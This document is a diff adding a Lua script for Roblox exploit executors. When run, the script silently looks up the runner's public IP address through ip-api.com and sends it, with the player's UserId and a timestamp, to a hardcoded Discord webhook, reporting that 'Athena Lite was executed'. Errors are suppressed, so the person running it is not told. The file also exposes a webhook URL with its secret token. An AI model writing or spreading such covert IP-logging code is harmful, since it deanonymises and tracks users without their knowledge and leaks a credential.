@@ -1,0 +1,60 @@
+-- ===== Exploit Logger & Alert Script for Executors =====
+
+local HTTP    = http_request or request or (syn and syn.request)
+local JSON    = game:GetService("HttpService")
+local PLAYERS = game:GetService("Players")
+
+assert(HTTP, "This executor does not expose an HTTP function!")
+
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1368928903955091557/AyMYSMqiLJAz1QRHqRNScibHAgyq2DjhHrqeNNeNHn81KOGyr3nSDiAGQLBNtsHprqmJ"
+
+-- Fetch the exploiter’s public IP
+local function fetchIP()
+    local ok, res = pcall(function()
+        return HTTP({
+            Url    = "http://ip-api.com/json",
+            Method = "GET",
+        })
+    end)
+    if ok and res and res.Body then
+        local data = JSON:JSONDecode(res.Body)
+        return data.query or "UNKNOWN"
+    end
+    return "UNKNOWN"
+end
+
+-- Build the Discord embed payload
+local function buildPayload(ip)
+    return {
+        username = "logs",
+        embeds   = {{
+            title       = "Execution detected",
+            description = "Athena Lite was executed",
+            fields      = {
+                { name = "UserId",        value = tostring(PLAYERS.LocalPlayer.UserId), inline = true },
+                { name = "IP Address",    value = ip,                                  inline = true },
+                { name = "Time (UTC)",    value = os.date("!%Y-%m-%d %H:%M:%S"),       inline = false },
+            },
+            color       = 16733525,  -- orange-red
+        }}
+    }
+end
+
+-- Send the log to Discord
+local function sendToDiscord(payload)
+    pcall(function()
+        HTTP({
+            Url     = WEBHOOK_URL,
+            Method  = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body    = JSON:JSONEncode(payload),
+        })
+    end)
+end
+
+-- Main
+spawn(function()
+    local ip      = fetchIP()
+    local payload = buildPayload(ip)
+    sendToDiscord(payload)
+end)
